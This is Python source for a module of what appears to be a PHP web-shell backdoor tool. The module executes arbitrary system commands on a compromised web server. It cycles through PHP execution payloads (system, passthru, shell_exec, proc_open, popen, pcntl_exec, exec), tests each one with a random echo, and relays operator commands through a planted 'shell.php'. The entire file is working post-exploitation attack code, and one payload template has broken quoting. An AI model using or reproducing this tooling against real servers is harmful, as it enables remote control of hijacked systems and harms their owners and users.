'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
import random

classname = 'Sh'
    
class Sh(Module):
    '''Execute system commands
    shell.sh " <command> " 
    '''
    
    visible = False
    
    vectors = [ 
               { "system()"       : "@system('%s 2>&1');",
                "passthru()"     : "passthru('%s 2>&1');",
                "shell_exec()"   : "echo shell_exec('%s 2>&1');"
              },
              {
                "proc_open()"    : "$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w'));" + \
                                   "$h = proc_open('%s', $p, $pipes); while(!feof($pipes[1])) echo(fread($pipes[1],4096));" + \
                                   "while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]);" + \
                                   "fclose($pipes[2]); proc_close($h);",
                "popen()"        : "$h = popen('%s','r'); while(!feof($h)) echo(fread($h,4096)); pclose($h);",
                "python_eval()"  : "@python_eval('import os; os.system('%s 2>&1');",
                "pcntl_exec()"   : "$args = array('%s'); pcntl_exec( '%s', $args );",
                "perl->system()" : "$perl = new perl(); $r = @perl->system('%s 2>&1'); echo $r;",
                "exec()"         : "exec('%s 2>&1', $r); echo(join(\"\\n\",$r));"
                }
            ]

    def __init__( self, modhandler , url, password):

        self.payload  = None

        modhandler.load('shell.php')

        Module.__init__(self, modhandler, url, password)
        
        if self.payload == None:
            raise ModuleException("system.exec",  "Shell interpreter initialization failed")

        
    def _probe( self ):

        for vect in self.vectors:
            for name, payload in vect.items():
                try:
                    rand     = random.randint( 11111, 99999 )
                    response = self.run( "echo %d" % rand, True, payload )
                    
                    if response == str(rand):
                        self.payload = vect[name]
                        print "[shell.sh] Shell interpreter loaded using method '%s'" % name
                        return
    
                except:
                    pass
                
        raise ModuleException("shell.sh",  "Shell interpreter loading failed")
                

    def run( self, cmd, err_to_stdout = True, payload = None ):
        
        if not payload:
            payload = self.payload

        if not err_to_stdout and ' 2>&1' in payload:
            payload = payload.replace(' 2>&1', '')

        if payload.count( '%s' ) == 1:
            payload = payload % cmd.replace( "'", "\\'" )
        else:
            args    = "','".join( cmd.split(' ')[1:] )
            cmd     = cmd.split()[0]
            payload = payload % ( args, cmd )

        return self.modhandler.load('shell.php').run(payload)



    
    
    